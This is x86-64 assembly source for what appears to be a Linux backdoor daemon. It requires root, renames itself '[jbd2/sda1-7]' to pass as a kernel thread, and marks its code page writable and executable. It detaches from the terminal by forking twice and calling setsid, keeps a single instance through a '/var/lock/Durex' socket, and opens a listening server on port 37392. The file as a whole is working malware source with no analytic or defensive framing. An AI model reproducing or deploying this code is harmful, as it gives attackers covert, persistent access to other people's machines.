BITS 64

section .text
    global _start
    extern create_server
    extern loop_server

_start:
    push    rbp
    mov     rbp, rsp
    xor     rax, rax
    add     eax, 0x66
    syscall
    cmp     eax, 0
    jne     exit
    call    check_instance
    mov     rdi, [rbp + 0x10]
    lea     rsi, [rel pname]
    call    strcpy
    lea     rdi, [$$]
    xor     rsi, rsi
    xor     rdx, rdx
    xor     eax, eax
    add     rsi, 0x1000
    add     rdx, 0x1 | 0x2 | 0x4 ; PROT_READ | PROT_WRITE | PROT_EXEC
    add     eax, 0xa ; mprotect
    syscall
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     rax, 0
    jne     exit
    xor     eax, eax
    add     eax, 0x70 ; setsid
    syscall
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     exit
    lea     rdi, [rel dir]
    xor     eax, eax
    add     eax, 0x50
    syscall
    mov     rdi, DWORD 37392
    call    create_server
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     fork2
    mov     rax, [rbp + 0x10]
    mov     BYTE [rax + 0xb], 53
    jmp     connect
fork2:
    xor     eax, eax
    add     eax, 0x39 ; fork
    syscall
    cmp     eax, 0
    jne     connect
    mov     rax, [rbp + 0x10]
    mov     BYTE [rax + 0xb], 54
connect:
    call    loop_server

exit:
    xor     rdi, rdi
    xor     eax, eax
    add     eax, 0x3c ; exit
    syscall
    ret 

strcpy:
    mov     al, [rsi]
    mov     [rdi], al
    mov     bl, [rsi]
    cmp     bl, 0
    je      end_strcpy
    inc     rdi
    inc     rsi
    jmp     strcpy
end_strcpy:
    ret

;   rsp -> sockfd
;   rsp + 0x4 -> len
;   rsp + 0x8 -> sockaddr
;   rsp + 0xa -> sockaddr.sun_path
check_instance:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x20
    xor     rsi, rsi
    xor     rdi, rdi
    xor     rdx, rdx
    xor     rax, rax
    inc     edi ; AF_UNIX
    mov     WORD [rsp + 0x8], di ; AF_UNIX
    add     esi, 2 ; SOCK_DGRAM
    add     eax, 0x29 ; socket
    syscall
    mov     DWORD [rsp], eax
    lea     rdi, [rsp + 0xa]
    lea     rsi, [rel lock_name]
    call    strcpy
    mov     DWORD [rsp + 0x4], 2 + lock_name.len
    xor     ecx, ecx
bindunsock:
    cmp     ecx, 2
    je      exit
    inc     ecx
    mov     edi, DWORD [rsp]
    lea     rsi, [rsp + 0x8]
    mov     edx, DWORD [rsp + 0x4]
    xor     eax, eax
    add     eax, 0x31 ; bind
    syscall
    cmp     eax, 0
    je      checkend
    cmp     eax, -98 ; EADDRINUSE
    jne     checkend
    mov     edi, DWORD [rsp]
    lea     rsi, [rsp + 0x8]
    xor     edx, edx
    xor     eax, eax
    add     edx, 110
    add     eax, 0x2a ; connect
    syscall
    cmp     eax, 0
    je      exit
    cmp     eax, -111 ; ECONNREFUSED
    jne     bindunsock
    lea     rdi, [rel lock_name]
    xor     eax, eax
    add     eax, 0x57 ; unlink
    syscall
    jmp     bindunsock
checkend:
    leave
    ret

    lock_name: db "/var/lock/Durex", 0
        .len: equ $ - lock_name
    pname: db "[jbd2/sda1-7]", 0
    dir: db "/", 0